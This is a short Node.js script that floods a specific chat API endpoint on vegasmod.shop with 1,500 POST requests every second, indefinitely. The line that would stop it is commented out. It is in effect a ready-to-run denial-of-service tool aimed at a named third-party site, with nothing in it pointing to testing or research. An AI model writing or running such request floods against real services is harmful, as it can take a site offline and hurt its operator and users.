const { default: axios } = require("axios");

const API_ENDPOINT = "https://vegasmod.shop/chat/api/visitor/2afb5801d2a2da4ee8e49782705f09e5/get_messages";
const REQUESTS_PER_SECOND = 1500;

async function sendResponse() {
    try {
        const response = await axios.post(API_ENDPOINT);
        console.log(response.data); // Assuming you want to log the response data
    } catch (error) {
        console.error("Error:", error.message);
    }
}

let requestCount = 0;

function sendBatch() {
    const promises = [];
    for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
        promises.push(sendResponse());
        requestCount++;
    }

    // Wait for all promises to resolve before scheduling the next batch
    Promise.all(promises)
        .then(() => {
            console.log(`Sent ${REQUESTS_PER_SECOND} requests. Total sent: ${requestCount}`);
        })
        .catch((error) => {
            console.error("Error sending batch:", error.message);
        });
}

// Set up an interval to send batches every second
const intervalId = setInterval(() => {
    sendBatch();
}, 1000);

// Uncomment the following line if you want to stop the process after a certain duration (e.g., 10 seconds)
// setTimeout(() => clearInterval(intervalId), 10000);
